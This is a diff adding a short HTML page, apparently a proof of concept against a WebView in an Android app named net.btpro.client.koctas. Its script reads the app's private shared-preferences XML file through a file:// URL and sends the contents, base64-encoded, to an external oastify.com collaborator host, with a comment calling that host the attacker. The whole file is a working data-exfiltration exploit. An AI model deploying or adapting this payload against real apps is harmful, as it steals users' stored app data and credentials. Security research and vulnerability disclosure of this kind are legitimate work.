@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        var url = 'file://data/data/net.btpro.client.koctas/shared_prefs/stryly-ab-sets.xml'; //local file
+    function load(url) {
+            var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                fetch('https://i3mvrrhqst6rranzg7z3jb9wzn5ft7hw.oastify.com/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
+                }
+            }
+    xhr.open('GET', url, true);
+            xhr.send('');
+        }
+    load(url)
+    </script>
+</body>
+</html>
